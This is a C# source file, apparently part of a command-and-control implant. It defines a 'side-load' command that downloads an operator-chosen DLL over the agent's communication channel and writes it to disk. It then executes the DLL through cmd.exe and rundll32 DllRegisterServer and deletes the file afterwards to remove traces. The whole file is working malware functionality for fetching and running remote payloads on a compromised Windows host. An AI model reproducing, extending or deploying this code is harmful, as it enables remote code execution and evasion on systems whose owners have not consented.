using Agent.Internal;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class SideLoadCommand : AgentCommand
    {
        public override string Name => "side-load";

        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
        {
            if (task.SplittedArgs.Length == 0)
            {
                result.Result = "Please specify the name of the dll to download & execute!";
                return;
            }

            var fileName = task.SplittedArgs[0];
            var fileContent = commm.Download(fileName, a =>
            {
                result.Info = $"Downloading {fileName} ({a}%)";
                commm.SendResult(result);
                }).Result;

            this.Notify(result, commm, $"{fileName} Downloaded");


            string path = string.Empty;
            if (task.SplittedArgs.Length > 1)
            {
                path = task.SplittedArgs[1];
            }
            else
            {
                path = Path.Combine(Environment.CurrentDirectory, Path.GetFileName(fileName));
            }

            using (FileStream fs = new FileStream(path, FileMode.Create, FileAccess.Write))
            {
                fs.Write(fileContent, 0, fileContent.Length);
            }

            this.Notify(result, commm, $"File saved to { path}");

            var output = Executor.ExecuteCommand(@"c:\windows\system32\cmd.exe", $"/c  rundll32.exe {path},DllRegisterServer");

            Thread.Sleep(5000);

            File.Delete(path);
            this.Notify(result, commm, $"File deleted");

            result.Result = output;
        }
    }
}
